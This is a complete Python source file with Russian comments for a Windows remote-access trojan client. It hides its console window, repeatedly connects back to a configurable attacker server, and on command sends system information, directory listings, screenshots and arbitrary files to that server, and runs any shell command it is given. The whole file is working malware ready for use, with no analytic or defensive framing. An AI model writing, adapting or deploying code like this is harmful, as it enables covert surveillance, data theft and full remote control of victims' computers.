# -*- coding: utf-8 -*-
import socket
import os
import subprocess
import sys
import time

# ========== МГНОВЕННОЕ СКРЫТИЕ КОНСОЛИ ==========
if sys.platform == "win32":
    import ctypes
    # Полностью прячем окно
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    # Дополнительно скрываем из трея
    ctypes.windll.kernel32.SetConsoleCtrlHandler(None, 1)
# =================================================

# ========== НАСТРОЙКИ ==========
SERVER_IP = "192.168.31.177"  # ⚡ ИЗМЕНИ НА IP СВОЕГО СЕРВЕРА
SERVER_PORT = 5555
# ===============================

# Встроенный скриншот (без внешних библиотек)
def take_screenshot():
    try:
        import win32gui
        import win32ui
        import win32con
        from PIL import Image
        import io
        
        # Получаем контекст экрана
        hdesktop = win32gui.GetDesktopWindow()
        left, top, right, bottom = win32gui.GetWindowRect(hdesktop)
        width = right - left
        height = bottom - top
        
        # Создаём контексты
        hwnd_dc = win32gui.GetWindowDC(hdesktop)
        mfc_dc = win32ui.CreateDCFromHandle(hwnd_dc)
        save_dc = mfc_dc.CreateCompatibleDC()
        
        # Создаём битмап
        bitmap = win32ui.CreateBitmap()
        bitmap.CreateCompatibleBitmap(mfc_dc, width, height)
        save_dc.SelectObject(bitmap)
        
        # Копируем экран
        save_dc.BitBlt((0,0), (width, height), mfc_dc, (0,0), win32con.SRCCOPY)
        
        # Конвертируем в изображение
        bmpinfo = bitmap.GetInfo()
        bmpstr = bitmap.GetBitmapBits(True)
        img = Image.frombuffer(
            'RGB',
            (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
            bmpstr, 'raw', 'BGRX', 0, 1
        )
        
        # Очистка
        win32gui.DeleteObject(bitmap.GetHandle())
        mfc_dc.DeleteDC()
        save_dc.DeleteDC()
        win32gui.ReleaseDC(hdesktop, hwnd_dc)
        
        # Сохраняем в байты
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        return img_bytes.getvalue()
        
    except Exception as e:
        return f"SCREEN_ERROR:{str(e)}".encode()

# Информация о системе
def get_system_info():
    info = []
    info.append(f"Computer: {os.getenv('COMPUTERNAME', 'Unknown')}")
    info.append(f"User: {os.getenv('USERNAME', 'Unknown')}")
    info.append(f"OS: {os.getenv('OS', 'Unknown')}")
    info.append(f"Arch: {os.getenv('PROCESSOR_ARCHITECTURE', 'Unknown')}")
    info.append(f"Current Dir: {os.getcwd()}")
    return "\n".join(info)

# Список файлов
def list_files(path):
    try:
        files = os.listdir(path if path else ".")
        result = f"Directory: {os.path.abspath(path if path else '.')}\n"
        result += "-"*40 + "\n"
        for f in files:
            full = os.path.join(path if path else ".", f)
            if os.path.isdir(full):
                result += f"[DIR]  {f}\n"
            else:
                size = os.path.getsize(full)
                result += f"[FILE] {f} ({size} bytes)\n"
        return result
    except Exception as e:
        return f"Error: {str(e)}"

# Отправка файла
def send_file(sock, path):
    try:
        if not os.path.exists(path):
            sock.send(b"ERROR: File not found")
            return
        size = os.path.getsize(path)
        sock.send(str(size).encode())
        ack = sock.recv(1024)
        with open(path, "rb") as f:
            sock.sendall(f.read())
    except Exception as e:
        try:
            sock.send(f"ERROR:{str(e)}".encode())
        except:
            pass

# Подключение к серверу
def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

# ========== ОСНОВНОЙ ЦИКЛ ==========
if __name__ == "__main__":
    # Максимально скрываем процесс
    if sys.platform == "win32":
        try:
            import win32process
            import win32api
            win32api.SetConsoleCtrlHandler(lambda x: True, True)
        except:
            pass
    
    while True:
        try:
            sock = connect()
            sock.send(b"WINDOWS_READY")
            
            while True:
                try:
                    cmd = sock.recv(4096).decode().strip()
                    if not cmd:
                        break
                    
                    if cmd == "EXIT":
                        sock.close()
                        sys.exit(0)
                    
                    elif cmd == "SYSTEM_INFO":
                        sock.send(get_system_info().encode())
                    
                    elif cmd.startswith("LIST "):
                        path = cmd[5:].strip()
                        result = list_files(path)
                        sock.send(result.encode())
                    
                    elif cmd.startswith("CD "):
                        path = cmd[3:].strip()
                        try:
                            os.chdir(path if path else os.path.expanduser("~"))
                            sock.send(f"OK: {os.getcwd()}".encode())
                        except Exception as e:
                            sock.send(f"ERROR: {str(e)}".encode())
                    
                    elif cmd.startswith("GET "):
                        path = cmd[4:].strip()
                        send_file(sock, path)
                    
                    elif cmd == "SCREEN":
                        result = take_screenshot()
                        if isinstance(result, bytes) and not result.startswith(b"SCREEN_ERROR"):
                            sock.send(str(len(result)).encode())
                            ack = sock.recv(1024)
                            sock.sendall(result)
                        else:
                            sock.send(result if isinstance(result, bytes) else result.encode())
                    
                    elif cmd.startswith("CMD "):
                        command = cmd[4:].strip()
                        try:
                            result = subprocess.run(
                                command,
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=30
                            )
                            output = result.stdout + result.stderr
                            sock.send(output.encode() if output else b"OK")
                        except Exception as e:
                            sock.send(f"ERROR: {str(e)}".encode())
                    
                    else:
                        sock.send(b"UNKNOWN COMMAND")
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    break
                    
            sock.close()
        except:
            time.sleep(5)
